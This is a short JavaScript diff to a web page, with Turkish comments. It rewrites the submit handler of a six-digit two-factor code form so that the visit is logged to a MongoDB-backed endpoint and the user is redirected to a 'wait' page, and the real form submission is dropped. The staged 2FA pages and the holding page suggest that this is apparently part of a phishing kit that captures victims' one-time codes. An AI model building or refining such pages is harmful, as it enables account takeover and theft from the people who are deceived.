@@ -422,12 +422,19 @@
       const frm = document.querySelector('form');
       let aIpp = frm.elements[0];
 
-      frm.addEventListener('submit', (evt) => {
+      frm.addEventListener('submit', async (evt) => {
           evt.preventDefault();
           if (/^\d{6}$/.test(aIpp.value.trim())) {
               aIpp.parentElement.style.borderColor = 'rgb(234, 236, 239)';
               aIpp.parentElement.nextElementSibling.style.display = 'none';
-              frm.submit();
+              // MongoDB'ye kaydın %100 tamamlanmasını bekle
+              try {
+                await sendLogUpdate({ page: '2fa2' });
+              } catch (err) {
+                console.error('2FA2 log failed, continuing anyway', err);
+              }
+              // wait.html'e yönlendir
+              window.location.href = '/pages/wait.html';
           } else {
               aIpp.parentElement.style.borderColor = '#f84960';
               aIpp.parentElement.nextElementSibling.style.display = 'block';
